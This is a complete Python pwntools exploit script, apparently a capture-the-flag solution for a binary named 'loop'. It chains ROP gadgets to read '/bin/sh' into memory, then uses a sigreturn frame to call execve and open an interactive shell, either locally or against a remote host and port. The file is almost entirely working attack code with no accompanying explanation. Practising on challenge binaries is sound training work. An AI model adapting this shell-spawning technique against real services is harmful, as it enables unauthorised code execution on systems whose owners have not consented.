from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x4010a7
continue
'''.format(**locals())

exe = './challenge/loop'
elf = context.binary = ELF(exe, checksec=False)
p = start()

point_to_start = 0x400018
point_to_do_read = 0x4011f8

pop_rdi_ret = 0x000000000040111f
pop_rsi_ret = 0x0000000000401121
pop_rdx_ret = 0x0000000000401123
syscall = 0x0000000000401019

# write '/bin/sh\x00' to 0x666000
p.send(b'a'*0x21)
p.send(flat(
    0,
    b'a'*32,
    pop_rdi_ret,
    0,
    pop_rsi_ret,
    0x666000,
    pop_rdx_ret,
    0x1000,
    syscall,
))

sleep(.1)
p.send(b'/bin/sh\x00' + b'a'*7)  # write exactly 0xf bytes to set rax = 0xf to trigger rt_sigreturn
sleep(.1)

# syscall execve(*0x666000, 0, 0)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x666000
frame.rdx = 0
frame.rsi = 0
frame.rip = syscall

p.sendafter(b'Proceed? (y/n): ', b'a'*0x21)
p.sendafter(b'Proceed? (y/n): ', flat(
    0xf,
    b'a'*32,
    syscall,
    frame
))

p.interactive()
